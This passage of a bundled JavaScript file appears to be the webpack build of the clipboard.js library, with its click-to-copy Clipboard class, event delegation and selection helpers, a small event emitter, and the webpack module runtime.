   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();

